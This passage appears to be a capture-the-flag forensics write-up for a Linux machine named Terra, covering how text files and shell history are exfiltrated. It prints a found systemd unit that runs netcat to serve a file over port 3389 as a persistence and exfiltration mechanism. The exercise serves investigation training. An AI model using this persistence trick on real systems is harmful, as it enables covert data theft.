Scenario: Someone or something is stealing files with a .txt extension from user directories. Determine how these thefts are occurring.

Task: Identify the command being ran and how it occurs.

Flag format: command,how it occurs

Machine: Terra
```

Steps:
```
sudo cat /var/log/syslog | grep ".txt"
Mar  7 06:33:20 terra systemd[1]: /lib/systemd/system/vestrisecreta.service:6: Ignoring unknown escap

```

# 3. (15)
Prompt:
```
Scenario: Text files are being exfiltrated from the machine using a network connection. The connections still occur post-reboot, according to network analysts.

The junior analysts are having a hard time with attribution because no strange programs or ports are running, and the connection seems to only occur in 60-second intervals, every 15 minutes.

Task: Determine the means of persistence used by the program, and the port used. The flag is the command that allows exfiltration, and the file its persistence mechanism uses.

Flag format: command,persistence

Machine: Terra
```

Steps:
```
garviel@terra:~$ cat /lib/systemd/system/whatischaos.service
[Unit]
Description=Run a service

[Service]
Type=exec
ExecStart=/bin/bash -c 'netcat -lp 3389 < /tmp/NMAP_all_hosts.txt'

```

Answer:
```

```

# 5. (15)
Prompt:
```
Scenario: Analysts have found a dump of commands on the Internet that refer to the Terra machine. The command history for one of the users with an interactive login is being stolen via unknown means. The network analysts canâ€™t find any persistent connections, but notice a spike in traffic on logon and logoff.

Task: Identify how the command history is stolen from the machine.

The flag is the file used to execute the commands, and where they are sent.

Flag format: /absolute/path/to/file,IP:port

Machine: Terra
```

Steps:
```
garviel@terra:~$ cat .bash_logout
# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy
